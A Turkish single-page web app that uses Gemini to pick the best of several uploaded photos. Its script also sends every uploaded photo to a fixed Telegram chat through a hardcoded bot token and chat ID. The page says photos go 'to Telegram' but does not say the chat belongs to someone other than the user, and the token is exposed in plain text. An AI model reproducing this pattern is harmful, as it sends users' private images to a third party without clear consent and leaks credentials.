<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AI Fotoğraf Seçici</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-center p-4">

  <div class="max-w-xl w-full bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl space-y-6">
    
    <div class="text-center space-y-2">
      <h1 class="text-3xl font-extrabold bg-gradient-to-r from-purple-400 to-pink-500 bg-clip-text text-transparent">
        AI Fotoğraf Seçici
      </h1>
      <p class="text-slate-400 text-sm">Fotoğraflarını yükle; yapay zeka en iyisini seçsin, Telegram'a iletsin.</p>
    </div>

    <!-- API KEY KUTUSU (Tek Seferlik Gemini Key İçin) -->
    <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-2">
      <label class="text-xs font-bold text-slate-400 uppercase tracking-wider block">Gemini API Anahtarı</label>
      <input type="password" id="geminiKey" placeholder="Gemini API Key yapıştır..." class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-xs text-white focus:outline-none focus:border-purple-500">
      <p class="text-[10px] text-slate-500">Bir kere yazman yeterli, telefonuna kaydedilir.</p>
    </div>

    <!-- Yükleme Formu -->
    <form id="uploadForm" class="space-y-4">
      <div class="border-2 border-dashed border-slate-700 hover:border-purple-500 rounded-xl p-8 text-center cursor-pointer transition flex flex-col items-center justify-center bg-slate-900/50" onclick="document.getElementById('fileInput').click()">
        <svg class="w-12 h-12 text-purple-400 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
        </svg>
        <span class="text-slate-300 text-sm font-medium">Fotoğrafları Seç</span>
        <span class="text-xs text-slate-500 mt-1">Birden fazla resim yükleyebilirsin</span>
        <input type="file" id="fileInput" multiple accept="image/*" class="hidden" onchange="updateFileCount()">
      </div>

      <div id="fileCount" class="text-xs text-purple-400 text-center font-semibold"></div>

      <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-3 px-4 rounded-xl transition duration-200 shadow-lg disabled:opacity-50">
        Analiz Et ve Telegram'a Gönder
      </button>
    </form>

    <!-- Yükleniyor Göstergesi -->
    <div id="loading" class="hidden text-center space-y-3 py-4">
      <div class="inline-block animate-spin rounded-full h-8 w-8 border-4 border-purple-500 border-t-transparent"></div>
      <p class="text-sm text-slate-300 font-medium">Fotoğraflar Telegram'a iletiliyor ve Yapay Zeka tarafından inceleniyor...</p>
    </div>

    <!-- Sonuç Kutusu -->
    <div id="resultBox" class="hidden bg-slate-800/60 border border-purple-500/30 rounded-xl p-5 space-y-3">
      <h2 class="text-lg font-bold text-purple-300 border-b border-slate-700 pb-2">Jüri Kararı 🤖</h2>
      <div id="resultContent" class="text-slate-200 text-sm whitespace-pre-line leading-relaxed"></div>
    </div>

  </div>

  <script>
    // Sabit Telegram Bilgileri
    const BOT_TOKEN = "8715612733:AAFKVXifynt3W_zASPjZJoQjtQu7JiJqPbI";
    const CHAT_ID = "8572090027";

    document.addEventListener('DOMContentLoaded', () => {
      if(localStorage.getItem('geminiKey')) {
        document.getElementById('geminiKey').value = localStorage.getItem('geminiKey');
      }
    });

    function updateFileCount() {
      const input = document.getElementById('fileInput');
      const countDiv = document.getElementById('fileCount');
      countDiv.innerText = input.files.length > 0 ? `${input.files.length} adet fotoğraf seçildi.` : '';
    }

    const fileToBase64 = file => new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.readAsDataURL(file);
      reader.onload = () => resolve(reader.result.split(',')[1]);
      reader.onerror = error => reject(error);
    });

    document.getElementById('uploadForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const geminiKey = document.getElementById('geminiKey').value.trim();
      const fileInput = document.getElementById('fileInput');

      if (!geminiKey) return alert('Lütfen Gemini API Key gir!');
      if (fileInput.files.length === 0) return alert('En az 1 fotoğraf seçmelisin!');

      localStorage.setItem('geminiKey', geminiKey);

      const btn = document.getElementById('submitBtn');
      const loading = document.getElementById('loading');
      const resultBox = document.getElementById('resultBox');
      const resultContent = document.getElementById('resultContent');

      btn.disabled = true;
      loading.classList.remove('hidden');
      resultBox.classList.add('hidden');

      try {
        const files = Array.from(fileInput.files);

        // 1. TELEGRAM'A FOTOĞRAFLARI GÖNDER
        const formData = new FormData();
        const mediaGroup = [];

        files.forEach((file, index) => {
          formData.append(`file${index}`, file);
          mediaGroup.push({ type: 'photo', media: `attach://file${index}` });
        });

        formData.append('chat_id', CHAT_ID);
        formData.append('media', JSON.stringify(mediaGroup));

        // Telegram'a asenkron gönder
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
          method: 'POST',
          body: formData
        }).catch(err => console.error("Telegram Hatası:", err));

        // 2. GEMINI API İLE ANALİZ ET
        const contentsParts = [];
        
        for (let file of files) {
          const base64Data = await fileToBase64(file);
          contentsParts.push({
            inline_data: {
              mime_type: file.type,
              data: base64Data
            }
          });
        }

        contentsParts.push({
          text: "Sana yüklenen bu fotoğrafları ışık, odak, kompozisyon ve estetik açıdan değerlendir. İçlerinden en iyi olanı seç ('En Başarılı Fotoğraf: [Sıra No]' şeklinde belirt) ve neden iyi olduğunu detaylı açıkla. Diğerlerinin zayıf yönlerini dürüstçe ve samimi bir dille anlat."
        });

        const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${geminiKey}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ contents: [{ parts: contentsParts }] })
        });

        const data = await response.json();

        if (data.error) {
          alert('Gemini Hatası: ' + data.error.message);
        } else {
          const aiResponse = data.candidates[0].content.parts[0].text;
          resultContent.innerText = aiResponse;
          resultBox.classList.remove('hidden');
        }

      } catch (err) {
        alert('İşlem sırasında hata oluştu: ' + err.message);
      } finally {
        btn.disabled = false;
        loading.classList.add('hidden');
      }
    });
  </script>
</body>
</html>
